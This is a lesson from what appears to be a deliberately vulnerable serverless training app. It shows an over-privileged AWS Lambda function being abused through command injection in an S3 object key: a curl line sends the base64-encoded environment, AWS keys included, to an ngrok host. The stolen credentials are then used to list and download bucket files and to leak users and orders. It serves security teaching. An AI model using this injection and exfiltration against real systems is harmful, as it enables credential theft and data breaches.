# LESSON #7: Over-Privileged Function

Maybe one of the most fundamental security vulnerabilities in serverless applications is over-privileged functions. [Previous research](https://www.protego.io/protego-labs-finds-nearly-all-serverless-application-functions-at-risk/) has found that almost all functions are configured with more permissions than what they actually need.

Let's see what we can do with that:

We already saw that one of the functions is vulnerable to command injection through an [insecure s3 configuration](../LESSONS/LESSON_04.md), so we can leverage that and steal the function's keys. By stealing the keys (AWS_SESSION_TOKEN, AWS_SECRET_ACCESS_KEY and AWS_ACCESS_KEY_ID), we will be able to assume the function's temporary execution role.

```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;b=`env|base64 --wrap=0` --acl public-read;curl 0c971764.ngrok.io?data=$b;echo x.raw' --profile hacker
```

It's not hard to find the relevant keys in the base64 string that we got:

![alt base64-keys](https://i.imgur.com/ig8iV2J.png)

Decoding them (`echo <BASE64> | base64 --decode`) will reveal (partial info):
```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=FQXXXXXXXXXXXXXXXPJnxYa8D85UCLwAXXXXXXXXXXXXXXXRUkQWDwu4NMqrE+dcRXXXXXXXXXXXXXXXrTB6PxZzyfw0pDFUJHXXXXXXXXXXXXXXXAFfF6kR5AjFSQd/SkjymXXXXXXXXXXXXXXXO+1JfHtJBFqwI7VnaHMcCoDp4O/WcXXXXXXXXXXXXXXXCNW886DrHxciDCXXXXXXXXXXXXXXXZt3k9f3WuwI/FfXXXXXXXXXXXXXXXp43gtQYe3IV1sCpPs/kUneXXXXXXXXXXXXXXXiZGU63V79bpu/Dt3fzO0eSHAO6ii4t9/gBQ==
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/DVSA-SEND-RECEIPT-EMAIL
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_STREAM_NAME=2018/12/23/[$LATEST]ce7961b403ba4b47806460db4bc62944
AWS_EXECUTION_ENV=AWS_Lambda_python2.7
AWS_LAMBDA_FUNCTION_NAME=DVSA-SEND-RECEIPT-EMAIL
PATH=/usr/local/bin:/usr/bin/:/bin:/opt/bin
SOURCE_EMAIL=tal+dvsa+noreply@protego.io
AWS_DEFAULT_REGION=us-east-1
PWD=/var/task
AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxI8g7+XkMv/6tuC7xxxxxxxxxx
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_REGION=us-east-1
ORDERS_TABLE=DVSA-ORDERS-DB
AWS_ACCESS_KEY_ID=ASIAYXXXXXXXXXXXXXXX
PYTHONPATH=/var/runtime
_HANDLER=lambda_function.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=256
```
Let's copy the relevant data into environment variables:
```
export AWS_SECRET_ACCESS_KEY = "..."
export AWS_ACCESS_KEY_ID = "..."
export AWS_SESSION_TOKEN = "..."
```

Or, into our AWS credentials - `~/.aws/credentials` (which is the default location):
![alt stolen-keys](https://i.imgur.com/tFXFZEj.png)

By default, temporary security credentials for an IAM user are valid for a maximum of 12 hours (and therefore, long gone in the screenshot). In this time frame, we can use these keys to run any AWS command that is aligned with the functions permissions. Since the function is (way) over-privileged, we can start stealing sensitive data and performing actions on the account.

For example:

(1) listing all files on s3:
![alt ls-bucket](https://i.imgur.com/Cg8cBYs.png)

(2) downloading a file from the bucket:
![alt download-receipt](https://i.imgur.com/3hMxfZP.png)

We can of course, also delete files. But, we are not limited to the S3! Let's explore further:

(3) leaking all users:
![alt leak-users](https://i.imgur.com/JVkreVB.png)

(4) orders from dynamodb:
![alt leak-orders](https://i.imgur.com/WdBSzVG.png)

And many more. I'll leave that to you to explore.

- - -
[ToC](../LESSONS/README.md) | [1](../LESSONS/LESSON_01.md) | [2](../LESSONS/LESSON_02.md) | [3](../LESSONS/LESSON_03.md) | [4](../LESSONS/LESSON_04.md) | [5](../LESSONS/LESSON_05.md) | [6](../LESSONS/LESSON_06.md) | [7](../LESSONS/LESSON_07.md) | [8](../LESSONS/LESSON_08.md) | [9](../LESSONS/LESSON_09.md) | [10](../LESSONS/LESSON_10.md)

